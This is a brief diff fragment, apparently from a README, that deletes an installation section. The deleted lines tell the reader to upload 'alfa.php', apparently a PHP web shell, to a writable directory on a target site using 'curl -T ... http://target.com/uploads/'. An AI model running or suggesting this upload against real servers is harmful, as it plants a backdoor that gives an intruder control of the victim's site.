@@ -23,7 +23,3 @@
 
 ---
 
-### 📁 Installation
-Simply upload the PHP file to a writable web directory:
-```bash
-curl -T alfa.php http://target.com/uploads/
